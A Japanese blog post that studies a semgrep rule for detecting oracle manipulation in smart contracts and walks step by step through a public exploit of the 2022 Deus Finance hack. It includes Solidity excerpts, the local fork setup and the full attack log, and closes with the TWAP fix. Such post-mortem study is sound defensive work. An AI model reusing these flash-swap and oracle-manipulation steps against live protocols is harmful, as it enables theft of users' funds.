+++
title = "semgrep-smart-contractsをすべて読む #01 (basic-oracle-manipulation)"
date = "2022-04-20"
tags = [
    "security",
]
+++

[semgrep-smart-contracts](https://github.com/Raz0r/semgrep-smart-contracts) というリポジトリがあります。
これは、スマートコントラクトの脆弱性を発見するためのsemgrepルールをまとめたものです。

このリポジトリの、検出ルールと脆弱なコードを読んでいくことで、スマートコントラクトの脆弱性を学びます。今回は、以下のルールを読んでいきます。

- [basic-oracle-manipulation.yaml](https://github.com/Raz0r/semgrep-smart-contracts/blob/master/solidity/basic-oracle-manipulation.yaml)
- [basic-oracle-manipulation.sol](https://github.com/Raz0r/semgrep-smart-contracts/blob/master/solidity/basic-oracle-manipulation.sol)

#### 検出ルール

まず、semgrepのルールを理解するために、ルールを日本語として表現します。

- 関数内の処理であること
- 関数の名称が `(?i)get([a-z0-9_])*price` にマッチすること
- `$X.div($Y)`、もしくは`$X / $Y`であること
- `$X`は以下の文字列のどれかを含むこと
    - `underlying`
    - `underlyingUnit`
    - `pair`
    - `reserve`
    - `reserve0`
    - `reserve1`
- `$Y`は`.*totalSupply.*`にマッチすること

このルールを実行すると、以下の2つがsemgrepによって検出されます。

```solidity
101┆ _sharePrice = totalSupply() == 0
102┆     ? underlyingUnit
103┆     : underlyingUnit.mul(balanceWithInvested()).div(totalSupply());
```

```solidity
355┆ ((dei.balanceOf(address(pair)) + (usdc.balanceOf(address(pair)) * 1e12)) *
356┆     1e18) / pair.totalSupply();
```

ルールと、何が検出されるのかは分かったものの、これだけでは何が脆弱なのか分からないので、エクスプロイトを調べてみます。

#### エクスプロイト

このスマートコントラクトに刺さるエクスプロイトを調べてみます。
Deus Financeというプロジェクトで、この手法を用いたハッキング被害が起こったようです。

- [Deus Financeなど複数のDeFiプロトコルで16億円超のハッキング被害](https://coinpost.jp/?p=330583)
- [The Deus Hack Explained](https://pwned-no-more.notion.site/The-Deus-Hack-Explained-647bf97afa2b4e4e9e8b882e68a75c0b)
- [Deus Finance oracle attack event analysis](https://knownseclab.com/en/news/62317468d5b228005a55cd45)
- [DEUS post mortem](https://lafayettetabor.medium.com/deus-post-mortem-3c65df12927f)

GitHubにエクスプロイトがあったので、これを読んで見ることにします。

https://github.com/PwnedNoMore/postmortem/blob/main/2022/deus/contracts/Exploit.sol

注意として、このエクスプロイトは2022年の3/15に発生したエクスプロイトになります。

Deus Financeでは、2022年の4/28にもオラクルを操作した問題が再発生しています。

まずはローカルのネットワークでこのエクスプロイトを実行をしてみます。
もともと `hardhat.config.js` に指定されているURLではダメなようなので、`https://rpc.fantom.network/`に変更して動作させます。

```javascript
      forking: {
        url: "https://rpc.fantom.network/",
        blockNumber: 33466613
      }
```

`npx hardhat run scripts/main.js` コマンドを実行すると、以下のような出力が得られます。

```
    [+] (0) before attack
    [+]      my USDC balance: 0
    [+]      my DEI balance: 0
    [+]      spirit USDC reserve: 9713881664165
    [+]      spirit DEI reserve: 9739342685820948870544271
    [+]      the amount of DEI to borrow (spirit): 9739342685820948870544270
    [+]      the amount of DEI to pay back (spirit): 9768648631716097162030362

    [+] (1) flash swap from spirit pool
    [+]      my USDC balance: 0
    [+]      my DEI balance: 9739342685820948870544270
    [+]      sAMM USDC reserve: 24660757275320
    [+]      sAMM DEI reserve: 24772798349205085390700207
    [+]      the amount of DEI to borrow (sAMM): 24772798349205085390700206
    [+]      the amount of DEI to pay back (sAMM): 24775275876792764667166923
    [+]      sAMM LP price: 2000000005487107362736617

    [+] (2) flash swap from sAMM pool
    [+]      my USDC balance: 0
    [+]      my DEI balance: 34512141035026034261244476
    [+]      my LP deposit token balance: 0
    [+]      my LP token balance: 0
    [+]      sAMM LP price: 997733504354413127115105

    [+] (3) liquidate the assets of victims
    [+]      my USDC balance: 0
    [+]      my DEI balance: 27150599219672207566872765
    [+]      my LP deposit token balance: 5230026958164438186
    [+]      my LP token balance: 0

    [+] (4) exit the flash swap from sAMM pool
    [+]      my USDC balance: 0
    [+]      my DEI balance: 2375323342879442899705842
    [+]      my LP deposit token balance: 5230026958164438186
    [+]      my LP token balance: 0

    [+] (5) deposit LP deposit tokens to earn LP tokens
    [+]      my LP deposit token balance: 0
    [+]      my LP token balance: 5230026958164438186

    [+] (6) remove liquidity
    [+]      my USDC balance: 5218173124837
    [+]      my DEI balance: 7617204163068582172512381
    [+]      my LP token balance: 0

    [+] (7) swap USDC to DEI from sAMM pool
    [+]      my USDC balance: 0
    [+]      my DEI balance: 12787419360961504871925327

    [+] (8) exit the flash swap from spirit pool
    [+]      my USDC balance: 0
    [+]      my DEI balance: 3018770729245407709894965

    [+] (9) swap DEI to USDC from sAMM pool
    [+]      my USDC balance: 3064570164495
    [+]      my DEI balance: 0
```

全部で9つのステップあるので、1ステップずつ読んでいきます。

##### 1 ) フラッシュスワップでDEIの借り入れ

エクスプロイトではまず、 `0x8eFD36aA4Afa9F4E157bec759F1744A7FeBaEA0e` から、フラッシュスワップを利用してDEIを借り入れます。

フラッシュスワップについてはこちらを参照してください。

https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps

```solidity
spiritUsdcDei.swap(0, _reserve1 - 1, me, abi.encode(uint8(0x1)));
```

この借り入れは、オラクルを操作した後、ユーザーの負債を返却する際に利用されます。

swapのコールバック関数の中で、`my DEI balance`が大きく増えていることが確認できます。

```
    [+] (1) flash swap from spirit pool
    [+]      my USDC balance: 0
    [+]      my DEI balance: 9739342685820948870544270
    [+]      sAMM USDC reserve: 24660757275320
    [+]      sAMM DEI reserve: 24772798349205085390700207
    [+]      the amount of DEI to borrow (sAMM): 24772798349205085390700206
    [+]      the amount of DEI to pay back (sAMM): 24775275876792764667166923
    [+]      sAMM LP price: 2000000005487107362736617
```

##### 2 ) オラクル計算元からDEIの借り入れ

次に、`0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0` から、DEIを借り入れます。

これは、上記アドレスのDEI, USDCの残高がオラクルとして用いられているため、それを操作する目的で借り入れるものです。

このようにして大量に借り入れることで価値が下がり、ユーザーの清算処理を行うことができます。

```solidity
sAMMUsdcDei.swap(0, _reserve1 - 1, me, abi.encode(uint8(0x2)));
```

借り入れ後、さらに`my DEI balance`が上昇していることが分かります。

```
    [+] (2) flash swap from sAMM pool
    [+]      my USDC balance: 0
    [+]      my DEI balance: 34512141035026034261244476
    [+]      my LP deposit token balance: 0
    [+]      my LP token balance: 0
    [+]      sAMM LP price: 997733504354413127115105
```

##### 3 ) 特定ユーザーの清算処理

以下のコードが呼び出され、特定のユーザーに対して清算処理が行われます。

```solidity
dei.approve(deiLenderSolidex.mintHelper(), dei.balanceOf(me));
deiLenderSolidex.liquidate(victims, me);
```

清算処理が実行されると、以下のコードが呼び出されます。

```solidity
function isSolvent(address user) public view returns (bool) {
    // accrue must have already been called!

    uint256 userCollateralAmount = userCollateral[user];
    if (userCollateralAmount == 0) return getDebt(user) == 0;

    return
        userCollateralAmount.mul(oracle.getPrice()).mul(LIQUIDATION_RATIO) /
            (uint256(1e18).mul(1e18)) >
        getDebt(user);
}
```

このとき、清算処理が実際に行われるかどうかを判断するために、getPrice関数が呼び出されます。
この関数は、プールしてあるDEIとUSDCの量から、DEIの価格を返却する関数です。

ステップ2でフラッシュスワップしているため、DEIの残高が低下しています。
そのため、担保割れしていると判断され、清算処理が行われます。

```solidity
function getPrice() external view returns (uint256) {
    return
        ((dei.balanceOf(address(pair)) + (usdc.balanceOf(address(pair)) * 1e12)) *
            1e18) / pair.totalSupply();
}
```

```
    [+] (3) liquidate the assets of victims
    [+]      my USDC balance: 0
    [+]      my DEI balance: 27150599219672207566872765
    [+]      my LP deposit token balance: 5230026958164438186
    [+]      my LP token balance: 0
```

##### 4 ) ステップ2でフラッシュスワップしたものを返却

攻撃の肝となる部分はほとんど終わったため、ここから先はフラッシュスワップの返却やLPトークンの売却などが行われます。

このステップでは、ステップ2で借り入れていたDEIの返却を行っています。

ログから、`my DEI balance`が低下していることが分かります。

```
    [+] (4) exit the flash swap from sAMM pool
    [+]      my USDC balance: 0
    [+]      my DEI balance: 2375323342879442899705842
    [+]      my LP deposit token balance: 5230026958164438186
    [+]      my LP token balance: 0
```

##### 5 ) LPトークンの引き出し

depositされているLPトークンを引き出します。

```
    [+] (5) deposit LP deposit tokens to earn LP tokens
    [+]      my LP deposit token balance: 0
    [+]      my LP token balance: 5230026958164438186
```

##### 6 ) LPトークンのburn

清算したことで得られたLPトークンをburnし、USDCとDEIを得ます。

https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/how-uniswap-works

```solidity
// prepare the LP burning
ERC20(address(sAMMUsdcDei)).transfer(address(sAMMUsdcDei), sAMMUsdcDei.balanceOf(me));

// burn the LP
sAMMUsdcDei.burn(me);
```

`my LP token balance`が0になり、`my USDC balance` / `my DEI balance`が増加していることが分かります。

```
    [+] (6) remove liquidity
    [+]      my USDC balance: 5218173124837
    [+]      my DEI balance: 7617204163068582172512381
    [+]      my LP token balance: 0
```

##### 7 ) USDCをDEIへスワップ

フラッシュローンの返却のため、USDCをDEIへスワップします。

ログにより、`my USDC balance`が0に、`my DEI balance`が増えていることが確認できます。

```
    [+] (7) swap USDC to DEI from sAMM pool
    [+]      my USDC balance: 0
    [+]      my DEI balance: 12787419360961504871925327
```

##### 8 ) ステップ1でフラッシュスワップしたものを返却

これで、借りたDEI以上の資金を用意できたため、フラッシュスワップが正常に終了します。

```
    [+] (8) exit the flash swap from spirit pool
    [+]      my USDC balance: 0
    [+]      my DEI balance: 3018770729245407709894965
```

##### 9 ) DEIをUSDCへスワップ

最終的に、3064570164495ドルが得られます。

```
    [+] (9) swap DEI to USDC from sAMM pool
    [+]      my USDC balance: 3064570164495
    [+]      my DEI balance: 0
```

#### 修正

今回の問題は、DEIの現在価格が、USDC / DEIのプールの現在の残高から導き出されてしまうことに問題がありました。

そのような実装になっていたため、フラッシュスワップでの大規模な借り入れが発生すると、DEIの現在価格が低く計算されてしまっていました。

そのためDeus Financeでは、Time-Weighted Average Price (TWAP)という時間加重平均を用いた価格算出ロジックに変更することで修正されました。

[Oracle.sol#L85-L91](https://github.com/deusfinance/lending-audit/blob/ed8f4f844235d34252e806f749f99ac46187950a/contracts/Oracle.sol#L85-L91)

[Oracles | Uniswap](https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles)
